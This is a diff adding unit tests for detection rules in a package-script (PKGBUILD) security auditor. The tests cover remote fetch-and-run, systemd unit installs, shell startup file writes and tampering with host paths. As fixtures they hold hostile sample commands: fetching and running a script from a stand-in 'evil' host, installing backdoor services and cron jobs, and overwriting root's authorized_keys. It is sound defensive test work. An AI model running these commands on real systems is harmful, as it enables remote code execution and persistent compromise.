@@ -526,6 +526,103 @@ class ExternalRulePackTest(unittest.TestCase):
             os.unlink(path)
 
 
+class AurAuditRuleTest(unittest.TestCase):
+    """aur-audit adapted rules (MIT-licensed, 2026-07-16). Each gets a positive-firing case
+    and a false-positive-safe case."""
+
+    # --- pipe_eval_remote (EXEC-01) --- #
+    def test_pipe_eval_remote_bash_curl(self):
+        self.assertIn('pipe_eval_remote', rules_for('bash <(curl -s https://evil/x.sh)'))
+        self.assertIn('pipe_eval_remote', rules_for('sh <(wget -qO- https://evil/x.sh)'))
+        self.assertIn('pipe_eval_remote', rules_for('zsh <(curl https://evil/x)'))
+
+    def test_pipe_eval_remote_not_plain_pipe(self):
+        # A plain pipe-to-shell (no process substitution) is pipe_to_shell territory,
+        # not pipe_eval_remote.
+        self.assertNotIn('pipe_eval_remote', rules_for('curl -s https://x | bash'))
+        # Process substitution without a preceding shell invocation is also not this rule.
+        self.assertNotIn('pipe_eval_remote', rules_for('<(curl https://x | bash)'))
+        # shell -c with command substitution (no process substitution)
+        self.assertNotIn('pipe_eval_remote', rules_for('bash -c "$(curl -s https://x)"'))
+
+    # --- systemd_unit_install (PERS-01) --- #
+    def test_systemd_unit_install_fires(self):
+        self.assertIn('systemd_unit_install',
+                      rules_for('install -Dm644 evil.service /etc/systemd/system/evil.service'))
+        self.assertIn('systemd_unit_install',
+                      rules_for('cp backdoor.service /usr/lib/systemd/system/backdoor.service'))
+        # install through /usr/lib/systemd/user also fires
+        self.assertIn('systemd_unit_install',
+                      rules_for('install -Dm644 evil.timer /usr/lib/systemd/user/evil.timer'))
+
+    def test_systemd_unit_install_not_pkgdir_prefixed(self):
+        # A normal PKGBUILD install through $pkgdir must NOT fire.
+        self.assertNotIn('systemd_unit_install',
+                         rules_for('install -Dm644 metricsd.service '
+                                   '"$pkgdir/usr/lib/systemd/system/metricsd.service"'))
+        # systemctl enable (not a file write) must NOT fire.
+        self.assertNotIn('systemd_unit_install',
+                         rules_for('systemctl enable foo.service'))
+        # A bare reference to a service file in a dep array must NOT fire.
+        self.assertNotIn('systemd_unit_install',
+                         rules_for("depends=('systemd')"))
+
+    # --- shell_rc_write (ENV-01) --- #
+    def test_shell_rc_write_fires(self):
+        # single > redirect (overwrite)
+        self.assertIn('shell_rc_write', rules_for('echo "evil" > ~/.bashrc'))
+        # cat > pattern
+        self.assertIn('shell_rc_write', rules_for('cat /tmp/payload > ~/.zshrc'))
+        # tee -a append
+        self.assertIn('shell_rc_write', rules_for('echo "evil" | tee -a ~/.bashrc'))
+        # quoted path
+        self.assertIn('shell_rc_write', rules_for('echo evil > "$HOME/.bash_profile"'))
+
+    def test_shell_rc_write_not_double_append(self):
+        # >> appends are caught by shell_function_inject; shell_rc_write should NOT fire.
+        self.assertNotIn('shell_rc_write', rules_for('echo "evil" >> ~/.bashrc'))
+        # Reading/sourcing (no write) must NOT fire.
+        self.assertNotIn('shell_rc_write', rules_for('source ~/.bashrc'))
+        # Merely mentioning the file name in a comment must NOT fire.
+        self.assertNotIn('shell_rc_write',
+                         rules_for('# users may edit their .bashrc'))
+        # > to a non-shell-rc file is not a hit.
+        self.assertNotIn('shell_rc_write', rules_for('echo done > /tmp/out.txt'))
+
+    # --- host_tamper (WRITE-01) --- #
+    def test_host_tamper_fires(self):
+        self.assertIn('host_tamper',
+                      rules_for('install -Dm644 evil.sh /usr/bin/evil'))
+        self.assertIn('host_tamper',
+                      rules_for('cp backdoor /etc/cron.hourly/backdoor'))
+        self.assertIn('host_tamper',
+                      rules_for('cp malware /opt/bin/malware'))
+        # Quoted absolute path should also fire.
+        self.assertIn('host_tamper',
+                      rules_for('install -Dm755 payload "/usr/local/bin/payload"'))
+        self.assertIn('host_tamper',
+                      rules_for('cp evil /root/.ssh/authorized_keys'))
+
+    def test_host_tamper_not_pkgdir_or_srcdir(self):
+        # Normal PKGBUILD installs through $pkgdir must NOT fire.
+        self.assertNotIn('host_tamper',
+                         rules_for('install -Dm644 README.md '
+                                   '"$pkgdir/usr/share/doc/foo/README.md"'))
+        # $srcdir-prefixed writes are normal.
+        self.assertNotIn('host_tamper',
+                         rules_for('install -Dm644 foo "$srcdir/foo"'))
+        # A chmod (not a file write) must NOT fire.
+        self.assertNotIn('host_tamper',
+                         rules_for('chmod 755 "$pkgdir/usr/bin/foo"'))
+        # A comment mentioning an absolute path must NOT fire.
+        self.assertNotIn('host_tamper',
+                         rules_for('# installs to /usr/bin by default'))
+        # A $pkgdir path on the same line as an absolute path should not fire
+        # when the absolute path is not the write target.
+        self.assertNotIn('host_tamper',
+                         rules_for('install -Dm644 "$srcdir/app" "$pkgdir/usr/bin/app"'))
+
+
 class ScanMechanicsTest(unittest.TestCase):
     def test_comment_lines_are_skipped(self):
         self.assertEqual([], audit.scan('# you should never do: curl evil | bash'))
